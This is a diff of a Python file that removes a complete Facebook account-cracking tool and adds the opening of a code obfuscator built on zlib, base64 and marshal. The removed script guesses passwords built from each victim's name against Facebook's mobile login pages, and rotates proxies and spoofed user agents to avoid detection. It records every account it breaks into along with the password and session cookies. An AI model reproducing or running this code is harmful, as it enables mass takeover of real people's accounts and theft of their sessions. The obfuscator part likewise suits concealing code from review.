@@ -1,525 +1,321 @@
-#MAKED-BY-MD RIFAT REZA
-#GITHUB-R4G3-F14M3
-#ACTIVE FILE CLONING
-#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
-#DEC-FUCK-YOUR-MOM-DON'T-BYPASS-MY-COMMAND
-# =[â€¢]=[SCRIPT]=[ADMIN]=[RIFAT]=[â€¢]=
-#------------------[ Install-1 ]-------------------#
-import os 
-#-----------------[ RIFAT-King ]-------------------# 
-os.system("pkg install sox -y")
-os.system("play op.mp3")
-os.system("pkg install espeak")
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-import requests,zlib,platform
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-pretty.install()
-CON=sol()
-#------------------[ USER-AGENT ]-------------------#
-ua = 'Mozilla/5.0 (Linux; Android 11; MI CC9 Pro Premium Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]' 
-ua = 'Mozilla/5.0 (Linux; Android 10; POCOPHONE F1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/347.0.0.17.97;]'
-ua = 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36'
-ua = 'okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 10; MI 8 MIUI/V11.0.6.0.QEACNXM) lite baiduboxapp/4.14.0.11 (Baidu; P1 10)'
-ua = 'Mozilla/5.0 (Linux; Android 10; Redmi K20 Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/290.0.0.16.119;]'
-ua = ["Davik/2.1.0 (Linux; U; Android 11.0.1; Infinix X688B Build/RP1A.200720.011) [FBAN/FB4A;FBAV/139.0.0.35.79;FBBV/890625930;FBDM/{density=2.0,width=1280,height=1440};;FBLC/en_GB;FBRV/410378857;FBCR/Zong;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X688B;FBSV/11;FBOP/16;FBCA/arm64-v8a:armeabi-v7a:armeabi;]",]
-ua = 'Dalvik/2.1.0 (Linux; U; Android 13; SM-S918U1 Build/TP1A.220624.014) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/13;FBAB/com.my.defense;FBAV/21.1.67800;FBBV/67800;FBVS/6.13.7;FBLC/en_US]'
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-try:
-	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
-	open('.prox.txt','w').write(prox)
-	
-except Exception as e:
-	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRIFAT')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(1000):
-	a='Mozilla/5.0 (Symbian/3; Series60/'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Nokia'
-	e=random.randrange(1000, 9999)
-	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/535.1'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
- 
- 
-	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c=' en-us; GT-'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile/15E148 Safari/605.1'
-	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
-for x in range(10):
-	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
-	b=random.randrange(1000, 9999)
-	c=random.randrange(1000, 9999)
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	h=random.randrange(1, 9)
-	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
-	j=random.randrange(1, 9)
-	k=random.randrange(1, 9)
-	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
-	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
- 
- 
- 
-def uaku():
-	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua:
-			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/SADIM-143/Ua.txt').text
-		ua=open('.bbnew.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
-cokbrut=[]
- 
-def back():
-	login()
-RIFAT="RIFAT"
-imt="SETU"
-ak="CLASS3-"
- 
-P = '\x1b[1;97m'
-M = '\x1b[1;91m'
-H = '\x1b[1;92m'
-K = '\x1b[1;93m'
-B = '\x1b[1;94m'
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m'
-N = '\x1b[0m'    
-Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
-x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +
-h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
- 
- 
-pwpluss,pwnya=[],[]
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
- 
-def alvino_xy(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def RIFATj(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-def clear():
-	os.system('clear')
-def back():
-	login()
-	
-	import getpass
- 
-attemps = 0
- 
-while attemps < 12345677901:
-    username = input(' \033[0;92mEnter Username: ')
-    password = input(' \033[0;93mEnter Password: ')
- 
-    if username == 't' and password == 'r':
-        print(' \033[0;92mYou Have Successfully Logged in.')
-        break
-    else:
-        print(' Incorrect Pass Please Trying ')
-        attemps += 1
-        continue
-os.system('clear')
-#------------------[ MAIN ]-----------------#
+# -*- coding:utf8 -*-
 
-def banner():
+# Import Modules
+import os
+import sys
+import zlib
+import time
+import base64
+import marshal
+import py_compile
+import requests
+
+# warna
+hijau  ="\x1b[1;92m"
+cyan   ="\x1b[1;96m"
+kuning ="\x1b[1;93m"
+ungu   ="\x1b[1;95m"
+putih  ="\x1b[1;97m"
+biru   ="\x1b[1;94m"
+merah  ='\x1b[1;91m'
+
+# Select raw_input() or input()
+if sys.version_info[0]==2:
+    _input = "raw_input('%s')"
+elif sys.version_info[0]==3:
+    _input = "input('%s')"
+else:
+    sys.exit("\n Your Python Version is not Supported!")
+
+
+def ketik(teks):
+ for i in teks + "\n":
+  sys.stdout.write(i)
+  sys.stdout.flush()
+  time.sleep(0.00001)
+
+
+x = "g2yw9wosnh3u3iejrbdu2oj2behsoskwbwgey"
+
+def sp(a):
+  for e in a + "\n":
+    sys.stdout.write(e)
+    sys.stdout.flush()
+    time.sleep(0.000002)
+
+def s(a):
+  for e in a + "\n":
+    sys.stdout.write(e)
+    sys.stdout.flush()
+    time.sleep(0.00002)
+
+
+def baner():
 	os.system("clear")
-	print (f"""
-\033[0;92mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—
-   .########..####.########....###....########
-.##.....##..##..##.........##.##......##...
-.##.....##..##..##........##...##.....##...
-.########...##..######...##.....##....##...
-.##...##....##..##.......#########....##...
-.##....##...##..##.......##.....##....##...
-.##.....##.####.##.......##.....##....##...
-\033[0;92mâ•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•   \033[0;92m               
-  \033[0;92mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-\033[0;92m â€¢ MD RIFAT REZA(ðŸ¥°)
-\033[0;92m â€¢ FILE CLONING ACTIVE FIRE (ðŸ”¥)
-\033[0;92m â€¢ VERSION CODE [ 1 ] FIRE (ðŸ˜»)
-  \033[0;92mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \033[1;31m""")
+	print ("%s+----------------------------------------------------------------+"%(putih))
+	sp("%s   ###    ##          ###    ##     ## #### ##    ##  "%(hijau))
+	sp("%s  ## ##   ##         ## ##   ###   ###  ##  ###   ##    "%(hijau))
+	sp("%s ##   ##  ##        ##   ##  #### ####  ##  ####  ##  "%(hijau))
+	sp("%s##     ## ##       ##     ## ## ### ##  ##  ## ## ## "%(hijau))
+	sp("%s######### ##       ######### ##     ##  ##  ##  ####  "%(hijau))
+	sp("%s##     ## ##       ##     ## ##     ##  ##  ##   ###  "%(hijau))
+	sp("%s##     ## ######## ##     ## ##     ## #### ##    ##    "%(hijau))
+	print ("%s+----------------------------------------------------------------+"%(putih))
+	print ("%s[%s~%s] %sAuthor  %s: %sALAMIN ANCHAR"%(hijau,cyan,hijau,putih,merah,hijau))
+	print ("%s[%s~%s] %sGithub  %s: %sMrALAMIN156"%(hijau,cyan,hijau,putih,merah,hijau))
+	print ("%s[%s~%s] %sName sc %s: %sLambda Py %s1,3   "%(hijau,cyan,hijau,putih,merah,hijau,kuning))
+	print ("%s+----------------------------------------------------------------+"%(putih))
+	print()
+	print()
+logo =("""\033[1;37m
+   ###    ##          ###    ##     ## #### ##    ##    
+  ## ##   ##         ## ##   ###   ###  ##  ###   ##    
+ ##   ##  ##        ##   ##  #### ####  ##  ####  ##    
+##     ## ##       ##     ## ## ### ##  ##  ## ## ##    
+######### ##       ######### ##     ##  ##  ##  ####    
+##     ## ##       ##     ## ##     ##  ##  ##   ###    
+##     ## ######## ##     ## ##     ## #### ##    ##    
+---------------------------------------------------
+AUTHOR    : ALAMIN ANCHAR  
+GITHUB    : MrALAMIN156
+FACEBOOK  : ALAMIN ANCHAR 
+TOOL NAME : HURD ENC  
+TOOL TYPE : FREE 
+VERSION   : 3.98.
+---------------------------------------------------""")
 def login():
-	banner()
-	RIFATj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
-	RIFATj('\033[0;97m===============================================')
-	RIFAT= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
-	if RIFAT in ['m']:
-		public()
-	elif RIFAT in ['1']:
-		crack_file()
-	elif RIFAT in ['i','0i']:
-		result()
-	elif RIFAT in ['2','02']:
-		os.system('xdg-open https://wa.me/+8801302199806')
-	elif RIFAT in ['0']:
-		os.system('rm -rf .token.txt')
-		os.system('rm -rf .cookie.txt')
-		print('#DONE LOGOUT ')
-		exit()
-	else:
-		print('# SELECT CORRECTLY ')
-		back()
-def error():
-	print(f'{k}#TRY AGAIN {u}')
-	time.sleep(4)
-	back()
-	
-def result():
-	os.system('clear')
-	banner()
-	print(' 1. CP ACCOUNT ')
-	print(' 2. OK ACCOUNT')
-	print(' 0. EXIT	')
-	kz = input('\n Choose : ')
-	if kz in ['1','01']:
-		try:vin = os.listdir('CP')
-		except FileNotFoundError:
-			print(' File Not Found')
-			time.sleep(3)
-			back()
-		if len(vin)==0:
-			print('You Have No CP Results ')
-			time.sleep(2)
-			back()
-		else:
-			cih = 0
-			lol = {}
-			for isi in vin:
-				try:hem = open('CP/'+isi,'r').readlines()
-				except:continue
-				cih+=1
-				if cih<10:
-					nom = '0'+str(cih)
-					lol.update({str(cih):str(isi)})
-					lol.update({nom:str(isi)})
-					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-				else:
-					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-			geeh = input('\n   Choose : ')
-			try:geh = lol[geeh]
-			except KeyError:
-				print(' CHOOSE RIGHT OPTION ')
-				exit()
-			try:lin = open('CP/'+geh,'r').read().splitlines()
-			except:
-				print('FILE NOT FOUND ')
-				time.sleep(2)
-				back()
-			nocp=0
-			for cpku in range(len(lin)):
-				cpkuni=lin[nocp].split('|')
-				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
-				sol().print(cpkuh,style="yellow")
-				nocp +=1
-			input('[ Click Enter ]')
-			back()
-	elif kz in ['2','02']:
-		try:vin = os.listdir('OK')
-		except FileNotFoundError:
-			print('File Not Found ')
-			time.sleep(2)
-			back()
-		if len(vin)==0:
-			print(' No OK FILE HERE ')
-			time.sleep(2)
-			back()
-		else:
-			cih = 0
-			lol = {}
-			for isi in vin:
-				try:hem = open('OK/'+isi,'r').readlines()
-				except:continue
-				cih+=1
-				if cih<100:
-					nom = ''+str(cih)
-					lol.update({str(cih):str(isi)})
-					lol.update({nom:str(isi)})
-					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-				else:
-					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-			geeh = input('\n CHOOSE : ')
-			try:geh = lol[geeh]
-			except KeyError:
-				print(' SELECT RIGHT OPTION ')
-				exit()
-			try:lin = open('OK/'+geh,'r').read().splitlines()
-			except:
-				print('File Not Found ')
-				time.sleep(2)
-				back()
-			nocp=0
-			for cpku in range(len(lin)):
-				cpkuni=lin[nocp].split('|')
-				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
-				sol().print(cpkuh,style="green")
-				nocp +=1
-			input('[ CLICK ENTER 2 BACK ]')
-			back()
-	elif kz in ['0','00']:
-		back()
-	else:
-		print('SELECT RIGHT OPTION ')
-		exit()
- 
-def public():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		os.system('clear')
-		banner()
-		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF IDZ: '))
-	except ValueError:
-		
-		back()
-	if jum<1 or jum>100000000:
-		
-		back()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input(' [] INPUT ID '+str(yz)+': ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print('#TRY AGAIN ')
-			os.system('clear')
-	try:
-		print(f' [] TOTAL ID: {P}'+str(len(id)))
-		print('')
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f'{u}')
-		back()
-	except (KeyError,IOError):
-		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
-		time.sleep(3)
-		back()
-		
-def crack_file():
-	os.system('clear')
-	banner()
-	os.system('espeak -a 300 " your file name"')
-	print('\033[1;32m [Put File Example:  /sdcard/RIFAT.txt  Etc...]')
-	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
-	print('')
-	try:lin = open(o).read().splitlines()
-	except:
-		print('File Not Found')
-		time.sleep(2)
-		back()
-	for xid in lin:
-		id.append(xid)
-	setting()
-	
-def setting():
-	hu = '3'
-	if hu in ['1','01']:
-		for tua in sorted(id):
-			id2.append(tua)
-	elif hu in ['2','02']:
-		muda=[]
-		for bacot in sorted(id):
-			muda.append(bacot)
-		bcm=len(muda)
-		bcmi=(bcm-1)
-		for xmud in range(bcm):
-			id2.append(muda[bcmi])
-			bcmi -=1
-	elif hu in ['3','03']:
-		for bacot in id:
-			xx = random.randint(0,len(id2))
-			id2.insert(xx,bacot)
-	else:
-		for bacot in id:
-			xx = random.randint(0,len(id2))
-			id2.insert(xx,bacot)
-	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD FIRE.. ')
-	os.system('espeak -a 300 " 1,  method,  FIRE"')
-	hc = input(' CHOOSE: ')
-	if hc in ['1','01']:
-		method.append('mobile')
-	elif hc in ['9','09']:
-		method.append('mbasic')
-	else:
-		method.append('mobile')
-	passwrd()
-	exit()
- 
-def passwrd():
-	os.system('clear')
-	banner()
-	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
-	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
-	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-	RIFATj(f'\033[0;97m===============================================')
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(nmf)
-					pwv.append('57273200')
-					pwv.append(frs+'@')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@@')
-					pwv.append(frs+'@@@')
-					pwv.append(frs+'@@@@')
-					pwv.append(frs+'@#')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'12')
-					pwv.append(frs+'11')
-					pwv.append(frs+'111')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(nmf)
-					pwv.append('57273200')
-					pwv.append(frs+'@')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@@')
-					pwv.append(frs+'@@@')
-					pwv.append(frs+'@@@@')
-					pwv.append(frs+'@#')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'12')
-					pwv.append(frs+'11')
-					pwv.append(frs+'111')
-					
-				pool.submit(crack,idf,pwv)
-	print('')
-	RIFATj('==========================================')
-	RIFATj('CLONING COMPLETE .......... ')
-	print(f'{h}[{h}ðŸŒº{h}]{h} Your Total OK idz : {h}%s '%(ok))
-	input('CLICK ENTER TO EXIT ')
-		
-def crack(idf,pwv):
-	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[ðŸRIFATðŸ] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
-	sys.stdout.flush()
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
-	ses = requests.Session()
-	for pw in pwv:
-		try:
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate, sdch","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, sdch', 'accept-language': 'en-US,en;q=0.9'}
-			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				#RIFAT-King
-				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢RIFAT-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
-				os.system('espeak -a 300 " C,  P"')
-			    #open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				#RIFAT-King
-				print(f'\r\033[0;92m[RIFAT-âž¼-OKðŸŒº] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
-				print('\033[0;94m===============================================')
-				os.system('espeak -a 300 " RIFAT,  Ok,  id"')
-				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
-				cek_apk(session,coki)
-				break
-				
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-	#----------------------------------------------#
-if __name__=='__main__':
-	try:os.system('git pull')
-	except:pass
-	try:os.system('touch prox.txt')
-	except:pass
-	
-login()
+  os.system("clear")
+  print ("%s+----------------------------------------------------------------+"%(putih))
+  sp("%s   ###    ##          ###    ##     ## #### ##    ##  "%(hijau))
+  sp("%s  ## ##   ##         ## ##   ###   ###  ##  ###   ##    "%(hijau))
+  sp("%s ##   ##  ##        ##   ##  #### ####  ##  ####  ##  "%(hijau))
+  sp("%s##     ## ##       ##     ## ## ### ##  ##  ## ## ## "%(hijau))
+  sp("%s######### ##       ######### ##     ##  ##  ##  ####  "%(hijau))
+  sp("%s##     ## ##       ##     ## ##     ##  ##  ##   ###  "%(hijau))
+  sp("%s##     ## ######## ##     ## ##     ## #### ##    ##    "%(hijau))
+  print ("%s+----------------------------------------------------------------+"%(putih))
+  print()
+  sp("\033[1;96m• \033[1;97mDownload Tokennya dulu")
+  sp("\033[1;96m• \033[1;97mLink \033[1;93m: \033[1;96m[ \033[1;97mhttps://sfile.mobi/34w5pODdgI3 \033[1;96m]")
+  print()
+  username = input ("\033[1;96m# \033[1;97mToken \033[1;93m:\033[1;92m ")
+  if username == x:
+    print()
+    s ("\033[1;92m✓ \033[1;97mToken Benar")
+    time.sleep(2)
+  else:
+    print()
+    s ("\033[1;91mX \033[1;97mToken Salah")
+    time.sleep(2)
+    login()
+
+
+# Encoding
+zlb = lambda in_ : zlib.compress(in_)
+b16 = lambda in_ : base64.b16encode(in_)
+b32 = lambda in_ : base64.b32encode(in_)
+b64 = lambda in_ : base64.b64encode(in_)
+mar = lambda in_ : marshal.dumps(compile(in_,'<x>','exec'))
+note = "\x23\x20\x4F\x62\x66\x75\x73\x63\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x41\x4C\x41\x4D\x49\x4E\x20\x41\x4E\x43\x48\x41\x52\x0A\x23\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x4D\x72\x41\x4C\x41\x4D\x49\x4E\x31\x35\x36\x20\x0A\x23\x0A\x45\x6E\x63\x6F\x64\x65\x64\x20\x62\x79\x20\x4D\x72\x41\x4C\x41\x4D\x49\x4E\x31\x35\x36\x0A\x23\x20\x54\x69\x6D\x65\x20\x3A\x20\x25\x73\x0A\x23\x20\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x2D\x0A\x0A"% time.ctime()
+def ban(): # Program Bann
+    os.system("clear")
+    print(cyan+" SUBSCRIBE YT "+putih+"TEACH ALAMIN ")
+    time.sleep(1)
+    os.system("xdg-open https://youtube.com/@teach-alamin")
+    time.sleep(1)
+def banner():
+    os.system("clear")
+    print ("%s+----------------------------------------------------------------+"%(putih))
+    sp("%s   ###    ##          ###    ##     ## #### ##    ##  "%(hijau))
+    sp("%s  ## ##   ##         ## ##   ###   ###  ##  ###   ##    "%(hijau))
+    sp("%s ##   ##  ##        ##   ##  #### ####  ##  ####  ##  "%(hijau))
+    sp("%s##     ## ##       ##     ## ## ### ##  ##  ## ## ## "%(hijau))
+    sp("%s######### ##       ######### ##     ##  ##  ##  ####  "%(hijau))
+    sp("%s##     ## ##       ##     ## ##     ##  ##  ##   ###  "%(hijau))
+    sp("%s##     ## ######## ##     ## ##     ## #### ##    ##    "%(hijau))
+    print ("%s+----------------------------------------------------------------+"%(putih))
+    print ("%s[%s~%s] %sAuthor  %s: %sALAMIN ANCHAR  "%(hijau,cyan,hijau,putih,merah,hijau))
+    print ("%s[%s~%s] %sGithub  %s: %sMrALAMIN156"%(hijau,cyan,hijau,putih,merah,hijau))
+    print ("%s[%s~%s] %sName sc %s: %sLambda Py %s1,3   "%(hijau,cyan,hijau,putih,merah,hijau,kuning))
+    print ("%s+----------------------------------------------------------------+"%(putih))
+def menu():
+    ketik ("%s{%s!%s}%s Note %s; %sCTRL+C%s / %sCTRL+Z Quit Tools"%(putih,merah,putih,kuning,merah,putih,merah,putih))
+    print()
